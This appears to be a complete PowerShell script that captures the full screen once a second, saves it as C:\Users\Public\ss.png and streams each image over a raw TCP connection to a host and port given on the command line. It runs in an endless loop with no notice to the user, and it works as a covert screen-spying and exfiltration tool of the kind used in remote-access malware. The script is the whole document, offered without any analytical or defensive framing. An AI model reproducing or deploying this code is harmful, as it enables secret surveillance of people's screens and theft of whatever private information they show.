$host.ui.RawUI.WindowTitle = "ss"

$Argument = $args[0]

$IP, $Port = $Argument -split ":"

write-host "IP: $IP"
write-host "Port: $Port"

# Create the TCP client and stream outside the loop
$socket = New-Object Net.Sockets.TcpClient($IP, $Port)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)

# Every 1 second send a screenshot to IP:Port.
while ($true) {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    # Take a screenshot
    try {
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $width = $screen.Width
        $height = $screen.Height
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        $bitmap.Save("C:\Users\Public\ss.png")
        $bitmap.Dispose()
        $graphics.Dispose()
        Write-Host "Screenshot taken! (Width: $width, Height: $height)"
    }
    catch {
        Write-Error $_.Exception.Message
    }

    # Send the screenshot to the server using TCP
    try {
        $writer.WriteLine("ss.png")
        $writer.Flush()
        $file = [System.IO.File]::ReadAllBytes("C:\Users\Public\ss.png")
        $stream.Write($file, 0, $file.Length)
        $stream.Flush()
        Write-Host "Screenshot sent! (Bytes: $($file.Length))"
    }
    catch {
        Write-Error $_.Exception.Message
    }

    # Break 1 second
    Start-Sleep -Seconds 1
}
